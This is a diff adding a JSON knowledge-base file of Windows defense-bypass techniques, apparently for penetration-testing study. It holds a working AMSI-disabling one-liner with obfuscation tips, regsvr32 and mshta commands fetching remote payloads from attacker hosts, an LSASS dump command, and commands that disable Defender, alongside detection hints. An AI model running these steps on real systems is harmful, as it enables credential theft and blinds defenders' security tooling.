@@ -1,0 +1,355 @@
+{
+  "phase": {
+    "id": "defense-bypass",
+    "title": "Defense Bypass",
+    "summary": "PrivEsc-adjacent: AMSI patching, Constrained Language Mode escape, AppLocker / Defender enumeration. Treat as supporting context, not a primary path.",
+    "icon": "shield-alert"
+  },
+  "nodes": [
+    {
+      "id": "bypass-amsi",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AMSI memory patching (Matt Graeber pattern)",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Patch AmsiScanBuffer in-process so PowerShell payloads stop being scanned.",
+      "mitre_attack_id": "T1562.001",
+      "tags": [
+        "amsi",
+        "bypass",
+        "powershell"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Classic one-liner (signatured but works as a template)",
+          "code": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.001",
+          "url": "https://attack.mitre.org/techniques/T1562/001/",
+          "kind": "mitre"
+        }
+      ],
+      "detection_hints": "Defender / EDR signatures the well-known string. Rotate the patch or use opaque reflection in production.",
+      "description_md": "AMSI (Antimalware Scan Interface) hooks into the PowerShell engine and other script hosts to scan content before execution. The Matt Graeber reflection technique sets the private static field `amsiInitFailed` to `true`, causing the `AmsiUtils` class to believe AMSI failed to initialize and skip all subsequent scans in the current PowerShell session.\n\n**How it works**: PowerShell's AMSI integration checks `AmsiUtils.amsiInitFailed` before calling `AmsiScanBuffer`. Setting this field to `true` via .NET reflection bypasses AMSI for the lifetime of the process.\n\n**Detection evasion**: The classic one-liner is heavily signatured. Use obfuscation:\n- String concatenation: `'System.Management.Automation.A'+'msiUtils'`\n- Character arrays: `[char[]]('A','m','s','i') -join ''`\n- Environment variable expansion\n- XOR-encoded strings decoded at runtime\n\n**Scope**: Only affects the current PowerShell process. Does not disable AMSI for child processes or other hosts (JScript, VBScript, .NET)."
+    },
+    {
+      "id": "bypass-clm",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Constrained Language Mode escape",
+      "severity": "high",
+      "difficulty": "red-team",
+      "summary": "Break out of CLM via runspaces, Add-Type with C# source, or PSv2 downgrade where available.",
+      "tags": [
+        "clm",
+        "bypass",
+        "powershell"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Check current mode",
+          "code": "$ExecutionContext.SessionState.LanguageMode"
+        },
+        {
+          "shell": "powershell",
+          "title": "PSv2 downgrade",
+          "code": "powershell.exe -version 2 -nop -ep bypass -c \"...\""
+        }
+      ],
+      "references": [],
+      "description_md": "PowerShell Constrained Language Mode (CLM) restricts access to .NET types, COM objects, and PowerShell features like `Add-Type`. It is enforced by AppLocker/WDAC policy.\n\n**Bypass methods**:\n\n**1. PSv2 downgrade** (requires PS 2.0 installed):\n```powershell\npowershell.exe -version 2 -nop -ep bypass -c \"...\"\n```\nPS v2 has no AMSI and no CLM — but Windows 10 1607+ removes it by default.\n\n**2. `Add-Type` with inline C#** (sometimes allowed in CLM):\nIf the policy is not enforced via WDAC/AppLocker but only via `$ExecutionContext.SessionState.LanguageMode`, certain .NET operations may still work.\n\n**3. Runspaces**:\nCreate a runspace in a separate thread (`[runspacefactory]::CreateRunspace()`) that may have a different language mode.\n\n**4. InstallUtil / MSBuild execution** — LOLBins that bypass AppLocker and often run in FullLanguage mode.\n\n**5. PowerShell alternative hosts**: `pwsh.exe` (PS Core 6/7) may not enforce the same CLM policy.",
+      "detection_hints": "PowerShell v2 execution (`powershell.exe -version 2`); runspace creation from constrained contexts; InstallUtil/MSBuild loading PS-related assemblies; CLM mode changes in session state."
+    },
+    {
+      "id": "bypass-applocker",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AppLocker bypass (LOLBin paths)",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Use signed Microsoft binaries (LOLBins) to execute code where direct .exe execution is denied.",
+      "tags": [
+        "applocker",
+        "lolbin",
+        "bypass"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "rundll32 + comsvcs",
+          "code": "rundll32.exe comsvcs.dll, MiniDump <pid> C:\\Temp\\lsass.dmp full"
+        }
+      ],
+      "references": [
+        {
+          "title": "LOLBAS",
+          "url": "https://lolbas-project.github.io/",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "AppLocker rules typically allow execution from `C:\\Windows\\` and `C:\\Program Files\\`, blocking unsigned executables from other paths. Living-off-the-land binaries (LOLBins) are Microsoft-signed executables in allowed paths that can be abused to execute attacker code.\n\n**Key LOLBins for code execution**:\n- `regsvr32 /s /n /u /i:http://attacker/s.sct scrobj.dll` — executes a remote COM scriptlet\n- `mshta http://attacker/payload.hta` — executes HTA applications\n- `msbuild.exe project.xml` — builds and executes inline C# from an XML project file\n- `installutil.exe /logfile= /logtoconsole=false /u payload.exe` — runs `UninstallAction` code\n- `rundll32.exe comsvcs.dll,MiniDump PID C:\\Temp\\dump.dmp full` — memory dumping\n- `cmstp.exe /ni /s payload.inf` — INF file execution\n\n**Writable AppLocker-allowed paths** (common):\n- `C:\\Windows\\Tasks\\`\n- `C:\\Windows\\Temp\\`\n- `C:\\Windows\\tracing\\`\n\nDrop a binary into an allowed writable path to bypass path-based AppLocker rules.",
+      "detection_hints": "Execution of LOLBins with unusual arguments (regsvr32 with /i:http://, msbuild with inline task); process creation from AppLocker-allowed writable paths; WDAC/AppLocker enforcement events."
+    },
+    {
+      "id": "bypass-defender",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Defender exclusion enumeration",
+      "severity": "medium",
+      "difficulty": "oscp-basic",
+      "summary": "Excluded paths/extensions/processes are safe drop zones for tooling.",
+      "tags": [
+        "defender",
+        "bypass",
+        "enumeration"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Get-MpPreference",
+          "code": "Get-MpPreference | Select ExclusionPath, ExclusionExtension, ExclusionProcess"
+        }
+      ],
+      "references": [],
+      "description_md": "Microsoft Defender maintains a list of exclusion paths, file extensions, and process names that bypass real-time scanning. Reading these exclusions via `Get-MpPreference` reveals locations where payloads can be dropped without triggering AV detection.\n\n**Key properties from Get-MpPreference**:\n- `ExclusionPath` — directories completely excluded from scanning\n- `ExclusionExtension` — file extensions not scanned (e.g., `.ps1`, `.exe` in legacy configs)\n- `ExclusionProcess` — processes whose reads/writes are excluded\n- `ExclusionIpAddress` — network exclusions\n\n**Operational use**: Drop tooling (WinPEAS, Mimikatz, Cobalt Strike implant) into an excluded path — it won't be scanned regardless of signature.\n\n**Privilege requirement**: Reading exclusions requires admin or SYSTEM by default. However, specific registry keys for managed exclusions may be readable by lower-privilege users in some configurations.\n\n**Alternative**: Even without reading exclusions, testing common default exclusions (`C:\\Windows\\Temp\\`, `C:\\ProgramData\\`) may reveal unmonitored drops.",
+      "detection_hints": "Defender management events (EID 5007 for config changes); high-value tools executed from excluded paths without detection; SIEM gaps in expected AV telemetry."
+    },
+    {
+      "id": "bypass-etw-patch",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ETW patching",
+      "summary": "Patch EtwEventWrite in-process to blind ETW-based telemetry.",
+      "description_md": "Many EDRs consume **ETW** (especially the .NET and threat-intel providers). Patching `ntdll!EtwEventWrite` with a `ret` in your process suppresses those events for your tooling. In-memory only; pairs with AMSI patching.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1562.006",
+      "detection_hints": "RWX changes to ntdll EtwEventWrite; absence of expected ETW events from a known-active process.",
+      "tags": [
+        "evasion",
+        "etw"
+      ],
+      "related": [
+        "bypass-amsi"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Concept",
+          "code": "# Resolve ntdll!EtwEventWrite, VirtualProtect RWX, write 0xC3 (ret), restore protection."
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.006 — Indicator Blocking",
+          "url": "https://attack.mitre.org/techniques/T1562/006/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "bypass-amsi-memory",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AMSI in-memory patch",
+      "summary": "Patch AmsiScanBuffer so every scan returns clean.",
+      "description_md": "Beyond string obfuscation, patch `amsi.dll!AmsiScanBuffer` in the current process to return `AMSI_RESULT_CLEAN`, neutralizing AMSI for subsequent script/assembly loads. The robust counterpart to the reflection trick.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1562.001",
+      "tags": [
+        "evasion",
+        "amsi"
+      ],
+      "related": [
+        "bypass-amsi"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Concept",
+          "code": "# GetProcAddress(amsi.dll, AmsiScanBuffer) -> VirtualProtect RWX -> write stub that sets result=CLEAN and returns S_OK."
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.001 — Disable or Modify Tools",
+          "url": "https://attack.mitre.org/techniques/T1562/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "bypass-defender-exclusions",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Add Defender exclusions",
+      "summary": "With admin, exclude your working directory so payloads aren't scanned.",
+      "description_md": "Once elevated, `Add-MpPreference -ExclusionPath` carves out a folder Defender ignores. Stage tooling there to run without real-time scanning. Loud (event 5007) but effective in labs.",
+      "severity": "medium",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1562.001",
+      "detection_hints": "Defender event 5007 (config change); new ExclusionPath/ExclusionProcess entries.",
+      "tags": [
+        "evasion",
+        "defender"
+      ],
+      "related": [
+        "bypass-defender",
+        "enum-defender-status"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Exclude a path",
+          "code": "Add-MpPreference -ExclusionPath 'C:\\Temp'",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MS Docs — Add-MpPreference",
+          "url": "https://learn.microsoft.com/en-us/powershell/module/defender/add-mppreference",
+          "kind": "msdoc"
+        }
+      ]
+    },
+    {
+      "id": "bypass-disable-defender",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Disable Defender real-time protection",
+      "summary": "Turn off real-time monitoring via policy/registry once at SYSTEM.",
+      "description_md": "With SYSTEM (and tamper protection off), `Set-MpPreference -DisableRealtimeMonitoring` or the `Policies\\...\\Windows Defender` registry keys disable scanning. Very loud — last resort in a lab.",
+      "severity": "medium",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1562.001",
+      "tags": [
+        "evasion",
+        "defender"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Disable RTP",
+          "code": "Set-MpPreference -DisableRealtimeMonitoring $true",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.001",
+          "url": "https://attack.mitre.org/techniques/T1562/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "bypass-lolbin-exec",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "LOLBins for execution / allow-list bypass",
+      "summary": "Signed Microsoft binaries proxy execution past application control.",
+      "description_md": "**LOLBAS** binaries (e.g. `msbuild.exe`, `installutil.exe`, `regsvr32`, `mshta`, `rundll32`) execute attacker code while being Microsoft-signed — defeating naive allow-listing and many AppLocker rules.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1218",
+      "tags": [
+        "evasion",
+        "lolbin",
+        "applocker"
+      ],
+      "related": [
+        "bypass-applocker"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "regsvr32 scriptlet",
+          "code": "regsvr32 /s /n /u /i:http://10.10.14.5/s.sct scrobj.dll"
+        },
+        {
+          "shell": "cmd",
+          "title": "mshta",
+          "code": "mshta http://10.10.14.5/p.hta"
+        }
+      ],
+      "references": [
+        {
+          "title": "LOLBAS Project",
+          "url": "https://lolbas-project.github.io/",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "bypass-ppl-lsass",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "PPL / LSASS protection bypass",
+      "summary": "Defeat RunAsPPL to dump a protected LSASS.",
+      "description_md": "When LSASS runs as a Protected Process Light, normal dumping fails. Loading a signed-but-vulnerable driver (BYOVD) can strip the protection so LSASS can be dumped. Driver-load is heavily monitored.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1562.001",
+      "tags": [
+        "evasion",
+        "ppl",
+        "lsass"
+      ],
+      "related": [
+        "cred-lsass-dump"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Approach",
+          "code": "Load a signed but vulnerable driver to clear the EPROCESS protection bit on lsass.exe, then dump. Triggers driver-load + LSASS-access telemetry."
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.001",
+          "url": "https://attack.mitre.org/techniques/T1562/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "bypass-unhook-ntdll",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Unhook ntdll (fresh copy)",
+      "summary": "Restore a clean ntdll .text to remove userland EDR hooks.",
+      "description_md": "EDRs patch inline hooks into `ntdll` syscall stubs. Mapping a fresh copy of ntdll from disk (or KnownDlls) and restoring the `.text` section removes those hooks so syscalls run un-intercepted. Often paired with direct/indirect syscalls.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1562.001",
+      "tags": [
+        "evasion",
+        "edr",
+        "ntdll"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Approach",
+          "code": "1. Map \\KnownDlls\\ntdll.dll (clean)\n2. Compare/restore the in-memory .text section of loaded ntdll\n3. Resume with un-hooked syscall stubs"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1562.001 — Disable or Modify Tools",
+          "url": "https://attack.mitre.org/techniques/T1562/001/",
+          "kind": "mitre"
+        }
+      ]
+    }
+  ]
+}
